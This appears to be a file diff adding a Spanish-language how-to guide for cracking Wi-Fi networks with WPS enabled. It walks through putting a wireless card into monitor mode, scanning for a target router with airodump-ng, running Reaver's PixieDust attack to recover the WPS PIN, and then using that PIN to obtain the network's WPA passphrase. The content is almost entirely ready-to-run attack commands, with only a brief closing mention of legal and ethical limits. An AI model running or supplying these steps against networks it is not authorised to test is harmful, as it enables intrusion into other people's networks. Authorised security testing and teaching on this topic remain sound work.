@@ -1,0 +1,84 @@
+# **Guía para Capturar el PSK y el PIN usando Reaver**
+
+## **Preparación del Entorno**
+
+### **Instalar las Herramientas Necesarias**
+```bash
+sudo apt-get update
+sudo apt-get install reaver aircrack-ng
+```
+
+### **Colocar la Interfaz Wi-Fi en Modo Monitor**
+```bash
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+```
+
+---
+
+## **Identificar la Red Objetivo**
+
+### **Usar `airodump-ng` para identificar redes disponibles**
+```bash
+sudo airodump-ng wlan0
+```
+- **Nota:** Anota el BSSID y el canal (CH) de la red objetivo.
+
+---
+
+## **Iniciar el Ataque con Reaver en Modo PixieDust**
+
+### **Comando para Iniciar Reaver**
+```bash
+sudo reaver -i wlan0 -b <BSSID_del_enrutador> -c <canal> -K 1 -vv
+```
+- **Descripción de parámetros:**
+    - `-i wlan0`: Especifica la interfaz Wi-Fi.
+    - `-b <BSSID_del_enrutador>`: Dirección MAC del enrutador objetivo.
+    - `-c <canal>`: Canal de la red Wi-Fi.
+    - `-K 1`: Activa el ataque PixieDust.
+    - `-vv`: Modo verboso para obtener más detalles en la salida.
+
+### **PixieWPS se ejecutará automáticamente y tratará de calcular el PIN. Si tiene éxito, verás el PIN en la salida de Reaver.**
+
+---
+
+## **Desencriptar el PSK usando el PIN Obtenido**
+
+### **Comando para Desencriptar el PSK**
+```bash
+sudo reaver -i wlan0 -b <BSSID_del_enrutador> -c <canal> -p <PIN> -vv
+```
+- **Parámetros:**
+    - `-p <PIN>`: Especifica el PIN WPS conocido.
+
+---
+
+## **Ejemplo Completo de Uso con Reaver**
+
+### **1. Colocar la interfaz en modo monitor**
+```bash
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+```
+
+### **2. Identificar redes Wi-Fi vulnerables**
+```bash
+sudo airodump-ng wlan0
+```
+
+### **3. Iniciar Reaver con PixieDust**
+```bash
+sudo reaver -i wlan0 -b <BSSID_del_enrutador> -c <canal> -K 1 -vv
+```
+
+### **4. Desencriptar el PSK usando el PIN**
+```bash
+sudo reaver -i wlan0 -b <BSSID_del_enrutador> -c <canal> -p <PIN> -vv
+```
+
+---
+
+Siguiendo estos pasos, podrás capturar tanto el PIN como el PSK de una red Wi-Fi con WPS habilitado, siempre dentro del marco legal y ético correspondiente.
